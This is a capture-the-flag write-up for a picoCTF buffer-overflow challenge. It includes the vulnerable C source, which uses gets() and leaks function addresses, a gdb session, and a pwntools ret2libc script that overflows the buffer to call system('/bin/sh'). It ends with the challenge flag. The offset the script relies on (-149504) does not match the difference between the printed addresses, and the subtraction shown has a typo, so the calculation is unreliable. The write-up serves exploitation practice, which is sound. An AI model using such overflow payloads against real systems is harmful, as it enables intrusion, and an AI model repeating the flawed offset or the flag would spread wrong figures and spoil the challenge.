

As someone not familiar with the Global Offset Table (got for short) this challenge took me awhile despite only being worth 250 points.
We are given a binary that prints out the addresses to some useful functions. Our goal is to land a shell on the box. We are given the source code so lets take a look:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#define BUFSIZE 148
#define FLAGSIZE 128

char useful_string[16] = "/bin/sh"; 
/* Maybe this can be used to spawn a shell? */
void vuln(){
  char buf[BUFSIZE];
  puts("Enter a string:");
  gets(buf);
  puts(buf);
  puts("Thanks! Exiting now...");
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Here are some useful addresses:\n");
  printf("puts: %p\n", puts);
  printf("fflush %p\n", fflush);
  printf("read: %p\n", read);
  printf("write: %p\n", write);
  printf("useful_string: %p\n", useful_string);
  printf("\n");
  vuln();
  return 0;
}
```

So we can see that get is an unsafe buffer of only 148 bytes and we have the addresses for several functions including puts which will be ran right after gets. What we really need though is the address of system. If we run the program locally using GDB, we can determine the address of system and we can use puts to determine the space between them. Since ASLR is running on the target machine, the addresses are randomized each time the program is ran which makes it harder to find the address of system. Fortunately, the space between system and puts is always the same and does not change.

```Bash
gdb-peda$ print &system
  $1 = (<text variable, no debug info> *) 0xf7e11200 <system>
gdb-peda$ print &puts
  $2 = (<text variable, no debug info> *) 0xf7e3bb40 <puts>
gdb-peda$
```

if we do the math, f7e11200-f7e3bbo = -149504 which is we will use as the systemOffset variable in our exploit script.
Since there is a string variable containing the path to /bin/sh, we want to overflow the buffer in order to call the system function while passing the path of our shell as an argument to it. Seems easy right? Well, its not terrible actually. I used pwntools in order to write and send the payload for me and then set it to give me an interactive process so that we could navigate around and find the flag:

```Python
from pwn import *
systemOffset = -149504

# we need puts and the shell address
proc = process('./vuln')
info = proc.recvuntil('puts: 0x')
puts = proc.recvuntil('\n')
print puts
putsAddr = int(puts, 16)
shell = proc.recvuntil('useful_string: 0x')
shell = proc.recvuntil('\n')
shellAddr = int(shell, 16)
system = putsAddr + systemOffset
payload = 'a'*(148+12) 

# For the overflow
payload += p32(system)
payload += 'aaaa'
payload += p32(shellAddr)
proc.sendline(payload)
proc.interactive()
``` 
Once we run it: python2.7 exploit.py,we are given a shell with which to navigate around and open the flag file:

picoCTF{syc4al1s_4rE_uS3fUl_bd99244d}
